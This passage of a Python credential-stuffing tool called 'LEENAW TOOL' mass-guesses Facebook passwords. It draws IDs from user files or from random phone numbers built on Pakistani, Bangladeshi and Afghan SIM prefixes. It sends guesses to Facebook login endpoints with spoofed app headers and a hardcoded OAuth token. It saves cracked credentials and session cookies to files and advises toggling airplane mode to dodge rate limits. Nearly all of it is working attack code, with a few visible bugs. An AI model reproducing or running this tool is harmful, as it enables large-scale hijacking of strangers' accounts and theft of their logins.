        elif uid[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif uid[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif uid[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif uid[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif uid[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif uid[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif uid[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif uid[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif uid[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif uid[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif uid[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        elif uid[:5] in ['10009']           :creation = '\33[1;37m| \33[1;33m2023' 
        else:creation=''
    elif len(uid) in [9,10]:
        creation = '\33[1;37m| \33[1;33m2008/2009'
    elif len(uid)==8:
        creation = '\33[1;37m| \33[1;33m2007/2008'
    elif len(uid)==7:
        creation = '\33[1;37m| \33[1;33m2006/2007'
    else:creation=''
    return creation
#_________[ PRINT LINE ]______>>
def linex():
    print('\033[1;97m====================================================')
#_________[ TOOL LOGO ]______>>
logo ="""\033[1;37m
██      ███████ ███    ██  █████  ██     ██ \033[1;34m
██      ██      ████   ██ ██   ██ ██     ██ \033[1;35m
██      █████   ██ ██  ██ ███████ ██  █  ██ \033[1;36m
██      ██      ██  ██ ██ ██   ██ ██ ███ ██ \033[1;38m
███████ ███████ ██   ████ ██   ██  ███ ███ \033[1;32mLEENAW 
\033[1;37m--------------------------------------------------
[⋆]CREATED BY     : \033[1;32mLEENAW \033[1;37m
[⋆]FACEBOOK       : \033[1;32mLEENAW (BIBI ANWAR)\033[1;37m
[⋆]STATUS         : \033[1;32mTRIAL\033[1;37m
--------------------------------------------------
[⋆] \033[1;37mVERSION    :\033[1;32m 1.1 \033[1;35m"ALHAMDULILLAH FOR EVERYTHING!"\033[1;37m
--------------------------------------------------"""
#_________[ MODULES CLEAR]______>>
clear() 
#_________[ USER IP SERVER ]______>>
ip = requests.get("https://api.ipify.org").text
print("\t \033[0;97m[⋆] \x1b[1;92mUSER IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
linex()
#_________[ LOGIN KEY ]______>>
CorrectUsername = 'LEENAW'
key = 'true'
while key == 'true':
    username = input('\033[0;97m[⋆]\033[1;96m⋆────➤\033[1;92mENTER KEY \033[1;91m: \x1b[1;92m')
    if username == CorrectUsername:
            print('\033[1;97m====================================================\n\033[0;97m[⋆]\033[1;32m LOGGED IN LEENAW TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
#_________[ MAIN MENU ]______>>
print("\t \033[0;97m[⋆] \x1b[1;92mUSER IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
linex()
def menu():
        try:
                x = ("sex")
                if x == ("sex"):
                        print('\t\x1b[1;92m        LEENAW TOOL MAIN MENU\n\033[1;97m====================================================\n\033[0;97m[1] \033[0;92mFILE CLONING\n\033[0;97m[2] \033[0;92mRANDOM PAK CLONING\n\033[0;97m[3] \033[0;92mCONTACT WITH OWNER\n\033[0;97m[0] \033[0;91mEXIT')
                        linex()
                        xd=input('\033[0;97m[⋆] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                        if xd in ['1','01']:
                                clear()
                                print('\t\x1b[1;92m        LEENAW TOOL FILE CLONER')
                                linex()
                                print('\033[0;97m[+] \33[1;92mPUT FILE EXAMPLE \x1b[1;91m:  \x1b[1;96m/sdcard/File.txt  etc..')
                                linex()
                                file = input('\033[0;97m[+] \033[0;92mFILE PATH \033[1;31m : \033[0;92m')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('\033[0;97m[⋆]\x1b[1;91m FILE LOCATION NOT FOUND')
                                        time.sleep(1)
                                        clear()
                                        menu()
                                clear()
                                print('\t\x1b[1;92m        LEENAW TOOL METHODS MENU')
                                linex()
                                print('\033[0;97m[1] \033[0;92mMETHOD \033[0;97m(\033[0;96mNEW IDS\033[0;97m)')
                                print('\033[0;97m[2] \033[0;92mMETHOD \033[0;97m(\033[0;96mMIX IDS\033[0;97m)')
                                print('\033[0;97m[3] \033[0;92mMETHOD \033[0;97m(\033[0;96mOLD/NEW IDS\033[0;97m)')
                                linex()
                                mthd=input('\033[0;97m[⋆] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input('\033[0;97m[+] \033[0;92mHOW MANY PASSWORD DO YOU WANT TO ADD ? : '))
                                except:
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     LEENAW TOOL PASSWORD MENU')
                                linex()
                                print('\033[0;97m[+]\033[1;32m EXAMPLE \033[0;91m: \033[0;96mfirst last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f'\033[0;97m[⋆] \x1b[1;92mPUT PASSWORD {i+1} \033[1;31m: \033[1;36m'))
                                clear()
                                print('\t\x1b[1;92m  LEENAW TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                print('\033[0;97m[⋆]\x1b[1;92m DO YOU WANT SHOW CP ACCOUNTS? \033[1;37m(\033[1;36my\033[1;37m/\x1b[1;96mn\033[1;37m) \033[1;31m: \x1b[1;93m')
                                linex()
                                cx=input('\033[0;97m[⋆] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('\t\x1b[1;92m   LEENAW TOOL FILE CRACKING MENU')
                                        linex()
                                        print('\033[0;97m[⋆] \033[0;92mTOTAL ACCOUNTS  \033[0;91m:  \033[0;96m'+total_ids+'')
                                        print("\033[0;97m[⋆] \x1b[1;92mCLONING STARTED \033[1;91m:  \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                                        print('\033[0;97m[⋆]\x1b[1;92m LEENAW TOOL CRACKING HAS BEEN STARTED')
                                        linex()
                                        print('\x1b[1;97m[⋆] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print('\033[0;97m[⋆]\x1b[1;92m THE PROCESS HAS COMPLETED')
                                print('\033[0;97m[⋆]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                                print('\033[0;97m[⋆]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/LEENAW-COOKIE.txt') 
                                print('\033[0;97m[⋆]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/LEENAW-OK.txt')
                                linex()
                                input('\033[0;97m[⋆]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   LEENAW TOOL RANDOM CLONING MENU')
                                linex()
                                print('\033[1;37m[1] \x1b[1;92mPAKISTAN RANDOM CLONING\n\033[1;37m[2] \x1b[1;92mBANGLADESH RANDOM CLONING\n\033[1;37m[3] \x1b[1;92mAFGHANISTAN RANDOM CLONING\n\033[1;37m[0] \033[1;32mBACK IN MAIN MENU ')
                                linex()
                                x=input('\033[0;97m[⋆] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']: 
                                        afg()
                                else:
                                        print('\033[0;97m[⋆] \033[0;91mCHOOSE CORRECT OPTION');menu()
                        elif xd in ['3','03']:
                                os.system('xdg-open https://www.facebook.com/mradi5000');menu() 
                        elif xd in ['0','00']:
                                clear()
                                print('\t\x1b[1;92m   EXIT FROM LEENAW TOOL')
                                linex()
                                input('\033[0;97m[⋆]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
                                os.system('xdg-open https://www.facebook.com/mradi5000');print('\x1b[1;97m[⋆] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE LEENAW TOOL');time.sleep(2);linex();exit() 
                        else:
                                print('\033[0;97m[⋆] \033[0;91mCHOOSE CORRECT OPTION');menu()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n\033[0;97m[⋆]\x1b[1;91mNO INTERNET CONNECTION...')
                exit()
#_________[ PAK RANDOM CLONER ]______>>
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  LEENAW TOOL PAK RANDOM CLONER MENU')
                linex()
                print('\t\x1b[1;92m       PAKISTAN SIM CODE MENU')
                linex()
                print('\033[1;32m PAKISTAN SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m0306,0315,0335,0345')
                linex() 
                code = input('\033[0;97m[⋆] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
                        limit = int(input('\t\x1b[1;92m        UIDS LIMIT MENU\n\033[1;97m====================================================\n\033[0;97m[⋆]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[1;97m====================================================\n\033[0;97m[⋆]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as LEENAW:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   LEENAW TOOL RANDOM PAK CRACKING MENU')
                        linex()
                        print('\033[0;97m[⋆] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[⋆]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[⋆] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        print('\033[0;97m[⋆]\x1b[1;92m LEENAW TOOL CRACKING HAS BEEN STARTED')
                        linex() 
                        print('\x1b[1;97m[⋆] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan123','khan123','khan12345','baloch123','baloch786','khan123456','i love you','khanbaba','khankhan','baloch','freefire','malik786','malik1122','malik123','malik12345','malik123456']
                                LEENAW.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[⋆]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[⋆]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                print('\033[0;97m[⋆]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/LEENAW-rndm-COOKIE.txt') 
                print('\033[0;97m[⋆]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/LEENAW-rndm-OK.txt')
                linex()
                input('\033[0;97m[⋆]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu()
#_________[ AFG RANDOM CLONER ]______>>      
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  LEENAW TOOL AFG RANDOM CLONER MENU')
                linex()
                print('\t\x1b[1;92m       AFG SIM CODE MENU')
                linex()
                print('\033[1;32m AFG SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m9377,9378,9379,.....etc')
                linex() 
                code = input('\033[0;97m[⋆] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m ')
                linex() 
                try:
                        limit = int(input('\t\x1b[1;92m        UIDS LIMIT MENU\n\033[1;97m====================================================\n\033[0;97m[⋆]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[1;97m====================================================\n\033[0;97m[⋆]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   LEENAW TOOL RANDOM AFG CRACKING MENU')
                        linex()
                        print('\033[0;97m[⋆] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[⋆]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[⋆] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        print('\033[0;97m[⋆]\x1b[1;92m LEENAW TOOL CRACKING HAS BEEN STARTED')
                        linex() 
                        print('\x1b[1;97m[⋆] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','khan123456','khankhan123','baloch','afghan','afghan12345','afghan123','afghan1234','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123']
                                BOSS.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[⋆]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[⋆]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                linex()
                input('\033[0;97m[⋆]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu()                
#_________[ BD RANDOM CLONER ]______>> 
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mLEENAW TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
                print('\t\x1b[1;92m      BANGLADESH  SIM CODE MENU')
                linex()
                print('\033[1;32m BANGLADESH SIM CODE EXAMPLE \x1b[1;91m: \x1b[1;96m016,017,018,019')
                linex()
                code = input('\033[0;97m[⋆] \033[1;32mPUT CODE \x1b[1;91m: \x1b[1;96m')
                clear()
                try:
                        limit = int(input('\t\x1b[1;92m        UIDS LIMIT MENU\n\033[1;97m====================================================\n\033[0;97m[⋆]\033[1;32m EXAMPLE \x1b[1;91m: \x1b[1;96m2000, 3000, 5000, 10000\n\033[1;97m====================================================\n\033[0;97m[⋆]\033[1;32m PUT LIMIT \x1b[1;91m: \x1b[1;96m'))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as BOSS:     
                        clear()
                        tl = str(len(user))
                        print('      \x1b[1;92mLEENAW TOOL RANDOM BANGLADESH CRACKING MENU')
                        linex()
                        print('\033[0;97m[⋆] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[⋆]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[⋆] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
                        print('\033[0;97m[⋆]\x1b[1;92m LEENAW TOOL CRACKING HAS BEEN STARTED')
                        linex() 
                        print('\x1b[1;97m[⋆] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                BOSS.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print('\033[0;97m[⋆]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                print('\033[0;97m[⋆]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
                linex()
                input('\033[0;97m[⋆]\x1b[1;92m PRESS ENTER TO BACK');clear()
                menu() 
#_________[ METHOD 1 ]______>>  
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLEENAW-M1\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113'])
                        ua = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"       
                        ua=random.choice(ugen)
                        head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        BOSS=session.cookies.get_dict().keys()
                        if "c_user" in LEENAW:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m[\033[0;97mLEENAW-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
                                open('/sdcard/LEENAW-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/LEENAW-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in LEENAW:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[\033[0;91mLEENAW-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                        open('/sdcard/LEENAW-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass
#_________[ METHOD 2 ]______>>  
def api(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLEENAW-M2\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                fbap = random.choice(['414.0.0.30.113','398.0.0.21.105','274.0.0.22.117','316.4.0.15.120','385.0.0.32.114','415.0.0.34.107','414.0.0.30.113','357.0.0.13.112','415.0.0.34.107','408.1.0.16.113','412.0.0.22.115','240.0.0.38.121','414.0.0.30.113'])
                                model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                                ua = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\33[1;92m[\033[0;97mLEENAW-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/LEENAW-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/LEENAW-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\33[1;97m[\033[1;92mLEENAW-2F\033[1;97m]\033[1;92m '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                   
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;91mLEENAW-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                open('/sdcard/LEENAW-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
#_________[ METHOD 3 ]______>>  
def api1(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mLEENAW-M3\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                                fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                                fbbv = str(random.randint(111111111,999999999))
                                android_version = device['android_version']
                                model = device['model']
                                build = device['build']
                                fblc = device['fblc']
                                fbcr = sim_id
                                fbmf = device['fbmf']
                                fbbd = device['fbbd']
                                fbdv = device['fbdv']
                                fbsv = device['fbsv']
                                fbca = device['fbca']
                                fbdm = device['fbdm']
                                fbfw = '1'
                                fbrv = '0'
                                fban = 'FB4A'
                                model = random.choice(['Infinix_X521','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                                fbap = random.choice(['414.0.0.30.113','414.0.0.30.113','354.0.0.8.108','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','414.0.0.30.113','413.0.0.30.104','414.0.0.30.113','408.1.0.16.113'])
                                ua = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'email':ids,
                    'password':pas,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
                                head = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
